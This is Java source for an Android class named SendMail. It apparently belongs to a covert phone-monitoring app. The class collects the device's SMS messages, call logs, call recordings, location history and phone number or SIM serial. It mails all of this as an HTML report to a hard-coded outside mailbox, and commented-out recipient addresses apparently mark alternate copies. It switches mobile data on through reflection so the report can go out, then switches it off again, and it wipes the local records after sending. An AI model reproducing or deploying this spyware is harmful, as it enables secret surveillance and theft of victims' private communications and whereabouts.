package com.smsbak.sms;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Random;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.util.Base64;
import cn.jpush.android.api.JPushInterface;

import com.smsbak.mail.MailSenderInfo;
import com.smsbak.mail.SimpleMailSender;
import com.smsbak.model.Call;
import com.smsbak.model.Location;
import com.smsbak.model.Logs;
import com.smsbak.model.Mail;
import com.smsbak.model.Sms;

public class SendMail {
	public static boolean isrun = false;
	public String body = "<html><style>table.gridtable {	font-family: verdana,arial,sans-serif;	font-size:11px;	color:#333333;	border-width: 1px;	border-color: #666666;	border-collapse: collapse;width:100%}table.gridtable th {	border-width: 1px;	padding: 8px;	border-style: solid;	border-color: #666666;	background-color: #dedede;}table.gridtable td {	border-width: 1px;	padding: 8px;	border-style: solid;	border-color: #666666;	background-color: #ffffff;}</style><body>";
	public String bodyend = "</body></html>";
	private Context context;
	private SharedPreferences sp;
	private SmsSqlUtils su;
	public static String regId = "";
	public static final String key = "Q049eWZtc21zYmFrcHJvLE9VPWNoaW5hLEM9MDMxMQ==";
	public static boolean ischange = false;
	public static boolean promptly=true;
	private static String clientdir = "smsclient";

	 private static final String tomail = "312829430@qq.com"; // yfm
	// private static final String tomail = "M13825254896";// 100
	// private static final String tomail = "ccmimi1361";// 101
	// private static final String tomail = "wutongshu_fei";// 102
	// private static final String tomail = "qq999925@163.com";// 104
	// private static final String tomail = "1521500629@qq.com";// 103
	// private static final String tomail="cz891366@163.com";//105
	// private static final String tomail="sheshouge@qq.com";//106
	// private static final String tomail="sheshouge@qq.com";//106
	// private static final String tomail="13623732234@yeah.net";//107
	// private static final String tomail="enjoyzhuang@163.com";//108
	// private static final String tomail="634730253@qq.com";//109
	// private static final String tomail="jonyes@qq.com";//111
	// private static final String tomail="huahuitao888888@163.com";//112
	// private static final String tomail="sansifly@163.com";//113
	// private static final String tomail="jyiquan@163.com";//114
	// private static final String tomail="542276228@qq.com";//116
	// private static final String tomail="camel2222@163.com";//117
//	 private static final String tomail="1841185724@qq.com";//115 ����
//	   private static final String tomail="shoujiseed@163.com";// 118
	 //private static final String tomail="zjt0828luck@163.com";//119
//	   private static final String tomail="8709941@qq.com";//120
//	   private static final String tomail="siusiumax1000@gmail.com";//121
//	   private static final String tomail="gaofeng20081212@163.com";//122
//	   private static final String tomail="i63admin@163.com";//123 ����
//	   private static final String tomail="happyyutiancao@163.com";//124 ����
//	   private static final String tomail="feiteng56@gmail.com";//124 ����
	   //private static final String tomail="273497407@qq.com";//127 ����
//	   private static final String tomail="mydeers@163.com";//128 
//	   private static final String tomail="sanjicnc@163.com";//129
	// private static final String tomail = "2796289601@qq.com"; // yfm
	 
	   

	private boolean first;

	public static String getTomail() {
		return tomail;
	}
	
	public static String getTag(){
		return tomail.substring(0, tomail.indexOf("@"));
	}

	public SendMail(Context context, SmsSqlUtils su) {
		isrun = false;
		this.context = context;
		this.su = su;
		sp = context.getSharedPreferences("config", Context.MODE_PRIVATE);
	}

	public synchronized void StartSend() {
		first = sp.getBoolean("first", true);
		MailSenderInfo mailInfo = new MailSenderInfo();
		
		boolean flag = getHtml(first,mailInfo);
		if (!getNetWorkState(context) && flag) {
			su.savelog("message", "���粻ͨ ������");
			ischange = setMobileDataEnabled(context, true);
			if (ischange) {
				su.savelog("message", "����򿪳ɹ�");
				Intent intent = new Intent("com.yfm.sms.sendmail");
				context.sendBroadcast(intent);
			} else {
				su.savelog("message", "�����ʧ��");
			}

			return;
		} else {
			su.savelog("message", "������������");
			JPushInterface.resumePush(context.getApplicationContext());
			su.savelog("message", "����ͨ��");
			ToSendMail(flag,mailInfo);
			if (ischange) {
				su.savelog("message", "�ر�����");
				ischange = setMobileDataEnabled(context, false);
			}
		}
	}

	public void ToSendMail(boolean send,MailSenderInfo mailInfo) {
		if (isrun) {
			return;
		}
		isrun = true;
		if (send) {
			mailInfo.setMailServerHost("smtp.139.com");
			mailInfo.setMailServerPort("25");
			mailInfo.setValidate(true);
			List<Mail> lm = su.getAllMail();
			if (lm.size() > 0) {
				Mail mail = lm.get(new Random().nextInt(lm.size()));
				mailInfo.setUserName(mail.getName());
				mailInfo.setPassword(mail.getPass());// ������������
				mailInfo.setFromAddress(mail.getName());
				su.savelog("message", "���ͷ�" + mail.getName());
			} else {
				su.savelog("message", "���ͷ�Ϊ��");
			}
			mailInfo.setToAddress(tomail);
			su.savelog("message", "Ŀ�ĵ�" + mailInfo.getToAddress());
			mailInfo.setSubject("����ͨѶ¼,��¼ʱ�� "+BootServer.smf.format(new Date()));
			// �������Ҫ�������ʼ�
			SimpleMailSender sms = new SimpleMailSender();
			boolean flag = sms.sendHtmlMail(mailInfo, su);// ����html��ʽ

			if (flag) {
				BootServer.isrequest=false;
				su.deleteAll();
				if (first) {
					su.savelog("message", "��ʼ�����ݷ��ͳɹ�");
					Editor edit = sp.edit();
					edit.putBoolean("first", false);
					edit.commit();
				}
				su.savelog("message", "���ͳɹ�");
			} else {
				su.savelog("message", "����ʧ��");
			}
		} else {

			su.savelog("message", "����Ϊ��");
		}
		isrun = false;
	}

	private boolean getHtml(boolean first,MailSenderInfo mailInfo) {
		StringBuffer html = new StringBuffer();
		html.append(body);
		html.append("<div style='font-size:13px;'>��������(SIM������)" + getnum()
				+ " ,ϵͳ�汾" + Build.VERSION.SDK_INT + " ,�ֻ��ͺ�" + Build.MODEL
				+ "--" + Build.PRODUCT + " " + SendMail.regId + "</div><br/>");

		if (first) {
			html.append("<h1>�״�ʹ��ȷ���ʼ�,������յ����ʼ�˵����ĳ���װ�ɹ�,�ʼ�ÿ"+BootServer.tosend/60000f+"���ӳ��Է���һ��<h1>");
		}

		html.append("<div style='font-size:11px;'>���ż�¼</div><br/>");
		List<Sms> lsms = su.getAllSms();
		html.append(GetSmsCon(lsms));
		html.append("<div style='font-size:11px;'>ͨ����¼</div><br/>");
		List<Call> lcall = su.getAllCall();
		html.append(GetCallCon(lcall));
		if(lcall!=null&&lcall.size()>0){
			List<File> fs=new ArrayList<File>();
			for(int i=0;i<lcall.size();i++){
				Call c=lcall.get(i);
				if(c.getRocordname()!=null&&!"".equals(c.getRocordname())){
					File f=new File(getFiledir(), c.getRocordname());
					if(f!=null&&f.exists()){
						fs.add(f);
					}
				}
			}
			mailInfo.setListfile(fs);
		}
		
		html.append("<div style='font-size:11px;'>λ�ü�¼</div><br/>");
		List<Location> lloc = su.getAllLocation();
		html.append(GetlocationCon(lloc));
		html.append("<div style='font-size:11px;'>������־</div><br/>");
		List<Logs> llog = su.getAllLog();
		html.append(GetLogCon(llog));

		html.append(bodyend);
		if (lsms.size() > 0 || lcall.size() > 0 || lloc.size() >= 28 || first||BootServer.isrequest) {
			mailInfo.setContent(html.toString());
			return true;
		} else {
			return false;
		}

	}
	
	public File getFiledir() {
		File file = null;
		if (Environment.getExternalStorageState().equals(
				Environment.MEDIA_MOUNTED)) {
			file = new File(context.getExternalCacheDir(),
					clientdir);
			if (!file.exists()) {
				file.mkdirs();
			}
		}
		return file;
	}

	private boolean setMobileDataEnabled(Context context, boolean enabled) {
		try {
			final ConnectivityManager conman = (ConnectivityManager) context
					.getSystemService(Context.CONNECTIVITY_SERVICE);
			final Class conmanClass = Class
					.forName(conman.getClass().getName());
			final Field iConnectivityManagerField = conmanClass
					.getDeclaredField("mService");
			iConnectivityManagerField.setAccessible(true);
			final Object iConnectivityManager = iConnectivityManagerField
					.get(conman);
			final Class iConnectivityManagerClass = Class
					.forName(iConnectivityManager.getClass().getName());
			final Method setMobileDataEnabledMethod = iConnectivityManagerClass
					.getDeclaredMethod("setMobileDataEnabled", Boolean.TYPE);
			setMobileDataEnabledMethod.setAccessible(true);
			setMobileDataEnabledMethod.invoke(iConnectivityManager, enabled);
			return true;
		} catch (Exception e) {
			// TODO Auto-generated catch block
			return false;
		}
	}

	public String GetSmsCon(List<Sms> lsms) {

		StringBuffer table = new StringBuffer();
		try {
			table.append("<table class=\"gridtable\"><tr><th style='width:150px'>ʱ��</th><th style='width:80px'>����</th><th style='width:100px'>����</th><th style='width:80px'>����</th><th>����</th></tr>");
			for (Sms sms : lsms) {
				table.append("<tr><td>" + sms.getDates() + "</td><td>"
						+ sms.getType() + "</td><td>" + sms.getAddress()
						+ "</td><td>" + sms.getPhonename() + "</td><td>"
						+ sms.getBody() + "</td></tr>");
			}
			if (lsms.size() == 0) {
				table.append("<td colspan='5'>������</td>");
			}
			table.append("</tbody></table><br />");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return table.toString();
	}

	public String GetCallCon(List<Call> lcall) {

		StringBuffer table = new StringBuffer();
		try {
			table.append("<table class=\"gridtable\"><tr><th style='width:150px'>ʱ��</th><th style='width:80px'>����</th><th style='width:100px'>����</th><th style='width:80px'>����</th><th>ʱ��</th><th>¼��</th></tr>");
			for (Call call : lcall) {
				table.append("<tr><td>" + call.getDates() + "</td><td>"
						+ call.getType() + "</td><td>" + call.getAddress()
						+ "</td><td>" + call.getPhonename() + "</td>"
						+ "<td>" + call.getDuration() + "</td><td>"
						+ call.getRocordname() + "</td></tr>");
			}
			if (lcall.size() == 0) {
				table.append("<td colspan='6'>������</td>");
			}
			table.append("</tbody></table><br />");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return table.toString();
	}

	public String GetlocationCon(List<Location> lloc) {

		StringBuffer table = new StringBuffer();
		try {
			table.append("<table class=\"gridtable\"><tr><th style='width:50px'>���</th><th style='width:150px'>��¼ʱ��</th><th style='width:80px'>λ��</th><th style='width:100px'>����</th><th style='width:80px'>γ��</th><th>�ٶȵ�ͼ�鿴</th></tr>");
			int i = 0;
			for (Location loc : lloc) {
				i++;
				table.append("<tr><td>"
						+ (i + 1)
						+ "</td><td>"
						+ loc.getTime()
						+ "</td><td>"
						+ loc.getAddr()
						+ "</td><td>"
						+ loc.getLatitude()
						+ "</td><td>"
						+ loc.getLongitude()
						+ "</td><td><a href='http://api.map.baidu.com/staticimage?markers="
						+ loc.getLongitude()
						+ ","
						+ loc.getLatitude()
						+ "&zoom=17&width=800&height=600' target='_blank'>�鿴</a></td></tr>");
			}
			if (lloc.size() == 0) {
				table.append("<td colspan='6'>������</td>");
			}
			table.append("</tbody></table><br />");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return table.toString();
	}

	public String GetLogCon(List<Logs> lloc) {

		StringBuffer table = new StringBuffer();
		try {
			table.append("<table class=\"gridtable\"><tr><th style='width:50px'>���</th><th style='width:150px'>��¼ʱ��</th><th style='width:80px'>���</th><th style='width:100px'>����</th></tr>");
			int i = 0;
			for (Logs loc : lloc) {
				i++;
				table.append("<tr><td>" + (i + 1) + "</td><td>" + loc.getTime()
						+ "</td><td>" + loc.getTag() + "</td><td>"
						+ loc.getContent() + "</td></tr>");
			}
			if (lloc.size() == 0) {
				table.append("<td colspan='6'>������</td>");
			}
			table.append("</tbody></table><br />");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return table.toString();
	}

	public static boolean getNetWorkState(Context context) {
		ConnectivityManager cm = (ConnectivityManager) context
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo networkinfo = cm.getActiveNetworkInfo();
		if (networkinfo != null && networkinfo.isAvailable()) {
			return true;
		} else {
			return false;
		}
	}

	public String getnum() {
		TelephonyManager tm = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);

		String tel = tm.getLine1Number();
		String imei = tm.getSimSerialNumber();
		if (tel != null && !"".equals(tel)) {
			return tel;
		} else {
			return imei;
		}
	}

	public String getPublicKey() {
		try {
			PackageManager pm = context.getPackageManager();
			PackageInfo info = pm.getPackageInfo(context.getPackageName(),
					PackageManager.GET_SIGNATURES);
			CertificateFactory certFactory = CertificateFactory
					.getInstance("X.509");
			X509Certificate cert = (X509Certificate) certFactory
					.generateCertificate(new ByteArrayInputStream(
							info.signatures[0].toByteArray()));
			String key=Base64.encodeToString(
					cert.getIssuerDN().getName().getBytes("UTF-8"),
					Base64.DEFAULT).trim();
			return key;
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

}
